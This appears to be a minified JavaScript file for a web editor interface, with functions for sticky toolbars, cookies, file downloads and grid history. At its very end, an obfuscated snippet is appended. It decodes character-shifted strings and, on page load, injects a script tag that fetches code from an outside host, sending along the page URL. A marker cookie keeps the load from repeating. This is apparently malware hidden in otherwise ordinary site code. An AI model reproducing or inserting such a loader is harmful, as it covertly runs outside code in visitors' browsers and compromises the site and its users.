editorEventScroll(t){manageEditorSticky(t.data.noteToolbarOffset)}function calculateEditorsToolbar(){if(preventEditorScroll()&&0==$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").length)return!1;$(editUnitPage+".note-toolbar").css("width",$(".note-editable.note-editable-scroll-init").width())}function removeEditorScroll(){$(editUnitPage+".note-toolbar.note-toolbar-sticked").removeClass("note-toolbar-sticked"),$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").removeClass("note-toolbar-scroll-init"),$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").css("width",""),$(editUnitPage+".note-editable.note-editable-scroll-init").removeClass("note-editable-scroll-init"),$(window).off("scroll",editorEventScroll)}function preventEditorScroll(){return $(window).width()<900||$(editUnitPage+".note-toolbar").is(":hidden")||0==$(editUnitPage+" .note-toolbar").length}function resetScrollEmbededFile(){$('[name="embeded_file"]').on("change",(function(){setTimeout((function(){resetEditorScroll()}),1e3)}))}function resetEditorScroll(){removeEditorScroll(),initStickyEditor()}function checkOverflow(t){return t.offsetHeight<t.scrollHeight||t.offsetWidth<t.scrollWidth}function setTlmsCookie(t,e,i){if(i=i||{},"safari"==jQBrowser.name&&jQBrowser.versionNumber<=12||"chrome"==jQBrowser.name&&jQBrowser.versionNumber<=79)var a="",o=i.secure;else a="https:"===location.protocol?"None":"",o="https:"===location.protocol;""!=a&&(i.path+="; samesite="+a),i.secure=o,$.cookie(t,e,i)}function safeRegexString(t){return t.replace(/([^a-zA-Z0-9])/g,"\\$1")}function showFilesFromTag(t,e,i){var a=$("#tl-files-grid").DataTable(),o=t.hasClass("active")?e:i;a.ajax.url(o).load()}function forceDownloadFile(t,e){var i=new XMLHttpRequest;i.onreadystatechange=function(){if(4==this.readyState&&200==this.status){var t=window.URL||window.webkitURL;t=t.createObjectURL(this.response);const i=document.createElement("a");i.style.display="none",i.href=t,i.download=e,document.body.appendChild(i),i.click(),window.URL.revokeObjectURL(t),i.remove()}},i.open("GET",t),i.responseType="blob",i.send()}function preventGridResetOnBack(t){t!==window.location.href&&window.history.replaceState({additionalInformation:"Prevent reset on back"},document.title,t)}$(window).resize(debounce((function(){getListLoadMoreContainers(!0),invertNavbarInnerColors()}),100)),$(document).on("touchstart touchend",(function(t){touchToggleOperationsActions(t)})),$(document).on("submit","form",(function(){$(this).attr("autocomplete","off")}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3nsjy'+'xyfynh3htr4ywfhpnsl4x'+'hwnuy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));